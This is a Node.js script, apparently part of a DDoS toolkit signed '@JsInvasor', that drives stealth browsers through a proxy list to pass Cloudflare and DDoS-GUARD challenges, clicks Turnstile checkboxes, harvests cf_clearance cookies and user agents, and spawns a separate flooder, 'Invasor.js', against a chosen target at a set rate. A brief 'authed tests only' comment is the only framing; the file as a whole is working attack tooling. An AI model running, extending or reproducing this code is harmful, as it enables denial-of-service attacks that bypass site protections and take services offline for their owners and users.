// authed tests only i made this for cf testing i hope u will like @JsInvasor
// updated for 2026 - puppeteer-real-browser + Turnstile support
const fs = require("fs");
const { connect } = require("puppeteer-real-browser");
const async = require("async");
const { exec, spawn } = require("child_process");

const COOKIES_MAX_RETRIES = 2;

const c = {
  reset:   "\x1b[0m",
  bold:    "\x1b[1m",
  dim:     "\x1b[2m",
  red:     "\x1b[31m",
  green:   "\x1b[32m",
  yellow:  "\x1b[33m",
  pink:    "\x1b[35m",
  cyan:    "\x1b[36m",
  white:   "\x1b[37m",
  gray:    "\x1b[90m",
  steel:   "\x1b[38;2;180;190;205m",
};

const PREFIX = `${c.gray}[${c.steel}Invasor${c.gray}@${c.steel}Browser${c.gray}]${c.reset} `;

function a(type, text) {
  console.log(`${PREFIX}${c.gray}&${c.reset} ${c.white}${text}${c.reset}`);
}

function b() {
  console.log(`${c.gray}>${c.reset} ${c.white}i hope you find some peace of mind${c.reset}`);
  console.log(`${c.gray}>${c.reset} ${c.white}i hope you find some paradise${c.reset}`);
  console.log();
}

const d = error => a("error", error);
process.on("uncaughtException", d);
process.on("unhandledRejection", d);

if (process.argv.length < 7) {
  a("error", "Usage: node browser.js <target> <time> <threads> <rate> <proxies.txt>");
  process.exit(1);
}

const targetURL = process.argv[2];
const duration = parseInt(process.argv[3], 10);
const threads = parseInt(process.argv[4], 10);
const rates = process.argv[5];
const proxyFile = process.argv[6];

const e = ms => new Promise(resolve => setTimeout(resolve, ms));

const f = (filePath) => {
  try {
    const data = fs.readFileSync(filePath, 'utf8');
    return data.trim().split(/\r?\n/);
  } catch (error) {
    a("error", `Error reading proxies file: ${error}`);
    return [];
  }
};

const proxies = f(proxyFile);

async function h(page, browserProxy) {
  const hasChallenge = await page.evaluate(() => {
    const title = document.title.toLowerCase();
    const body = document.body?.innerText?.toLowerCase() || '';
    return title.includes('just a moment') ||
      title.includes('checking') ||
      title.includes('attention required') ||
      body.includes('checking your browser') ||
      !!document.querySelector('.cf-turnstile') ||
      !!document.querySelector('#challenge-form') ||
      !!document.querySelector('#challenge-stage');
  });

  if (!hasChallenge) {
    a("info", `No challenge detected → ${browserProxy}`);
    await e(2000);
    return;
  }

  a("info", `Challenge detected → ${browserProxy}`);

  // Try clicking checkbox on main page
  try {
    await page.waitForSelector('input[type="checkbox"]', { visible: true, timeout: 5000 });
    await page.click('input[type="checkbox"]');
    a("info", `Clicked checkbox → ${browserProxy}`);
  } catch {
    // Try inside CF iframe
    const frames = page.frames();
    for (const frame of frames) {
      if (frame.url().includes('challenges.cloudflare.com')) {
        try {
          await frame.click('input[type="checkbox"]');
          a("info", `Clicked checkbox inside iframe → ${browserProxy}`);
          break;
        } catch {}
      }
    }
  }

  // Poll up to 60s for challenge to solve
  a("info", `Waiting for challenge to solve → ${browserProxy}`);
  let solved = false;
  for (let i = 0; i < 30; i++) {
    await e(2000);
    const stillChallenge = await page.evaluate(() => {
      const title = document.title.toLowerCase();
      return title.includes('just a moment') || title.includes('checking') || title.includes('attention required');
    });
    if (!stillChallenge) {
      a("info", `Challenge solved → ${browserProxy}`);
      solved = true;
      break;
    }
    if (i > 0 && i % 5 === 0) {
      a("info", `Still waiting... (${(30 - i) * 2}s left) → ${browserProxy}`);
    }
  }

  if (!solved) {
    a("warn", `Challenge timeout → ${browserProxy}`);
  }

  // Wait for cookies to settle
  await e(5000);
}

async function i(targetURL, browserProxy) {
  const isRaw = browserProxy === "raw";
  let browser;
  try {
    const launchArgs = [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-blink-features=AutomationControlled',
    ];
    if (!isRaw) launchArgs.push(`--proxy-server=${browserProxy}`);

    const result = await connect({
      headless: false,
      args: launchArgs,
      turnstile: true,
      fingerprint: {
        devices: ['desktop'],
        locales: ['en-US'],
        screens: ['1920x1080'],
      },
      customConfig: {
        userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
        viewport: { width: 1920, height: 1080 },
      },
    });

    browser = result.browser;
    const page = result.page;

    page.setDefaultNavigationTimeout(60000);

    // Retry navigation up to 3 times
    let navSuccess = false;
    for (let attempt = 0; attempt < 3 && !navSuccess; attempt++) {
      try {
        await page.goto(targetURL, { waitUntil: 'domcontentloaded', timeout: 60000 });
        navSuccess = true;
      } catch (navErr) {
        a("warn", `Nav attempt ${attempt + 1}/3 failed → ${browserProxy}: ${navErr.message}`);
        if (attempt < 2) await e(3000);
      }
    }
    if (!navSuccess) throw new Error('Navigation failed after 3 attempts');

    await h(page, browserProxy);

    const title = await page.title();

    // Retry cookie extraction up to 5 times for cf_clearance
    let cookies = await page.cookies();
    let cfClearance = cookies.find(ck => ck.name === 'cf_clearance');

    if (!cfClearance) {
      for (let attempt = 0; attempt < 5; attempt++) {
        await e(3000);
        cookies = await page.cookies();
        cfClearance = cookies.find(ck => ck.name === 'cf_clearance');
        if (cfClearance) {
          a("info", `cf_clearance found (attempt ${attempt + 1}) → ${browserProxy}`);
          break;
        }
      }
    }

    const userAgent = await page.evaluate(() => navigator.userAgent);
    const cookieStr = cookies.map(ck => ck.name + "=" + ck.value).join("; ").trim();

    return { browser, title, browserProxy, cookies: cookieStr, userAgent };
  } catch (error) {
    a("error", `Browser error: ${error.message} → ${browserProxy}`);
    if (browser) await browser.close();
    return null;
  }
}

async function j(targetURL, browserProxy, task, done, retries = 0) {
  if (retries >= COOKIES_MAX_RETRIES) {
    done(null, { task });
    return;
  }
  let browser = null;
  try {
    const response = await i(targetURL, browserProxy);
    if (!response) {
      throw new Error("Failed to open browser");
    }
    browser = response.browser;

    const failTitles = [
      "Just a moment",
      "Attention Required",
      "Please Wait",
      "Checking your browser",
      "DDOS-GUARD",
    ];

    if (failTitles.some(t => response.title.includes(t))) {
      a("error", `Bypass failed → ${response.title} | ${response.browserProxy}`);
      if (browser) await browser.close();
      done(null, { task });
      return;
    }

    a("info", `Bypassed → ${response.title} | ${response.browserProxy}`);
    a("info", `Cookies → ${response.cookies.substring(0, 80)}...`);

    spawn("node", [
      "Invasor.js",
      targetURL,
      "100",
      "2",
      response.browserProxy,
      rates,
      response.cookies,
      response.userAgent
    ]);

    if (browser) await browser.close();
    done(null, { task });
  } catch (error) {
    a("error", `Thread error: ${error.message} → ${browserProxy}`);
    if (browser) await browser.close();
    await j(targetURL, browserProxy, task, done, retries + 1);
  }
}

const queue = async.queue(function (task, done) {
  j(targetURL, task.browserProxy, task, done);
}, threads);

async function k() {
  b();
  a("info", `Starting Browser`);
  a("info", `Target: ${targetURL}`);
  a("info", `Proxies: ${proxies.length} | Threads: ${threads} | Duration: ${duration}s`);
  console.log();

  for (const browserProxy of proxies) {
    queue.push({ browserProxy });
  }

  await e(duration * 1000);

  exec('pkill -f Invasor.js', () => {});
  exec('pkill chrome', () => {});
  exec('pkill chromium', () => {});
  process.exit();
}

k();
